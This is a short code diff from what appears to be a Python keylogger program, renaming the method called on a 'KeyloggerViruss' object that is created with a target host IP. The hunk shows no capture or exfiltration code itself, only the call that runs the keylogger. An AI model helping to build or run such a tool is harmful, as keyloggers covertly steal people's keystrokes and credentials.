@@ -145,7 +145,7 @@ def main():
 
     # 3. Run keylogger
     keylogger = KeyloggerViruss(host=IP)
-    keylogger.run_keylogger()
+    keylogger.run()
     print("End process keylogger. Deleting and creating backup...")
 
 if __name__ == "__main__":
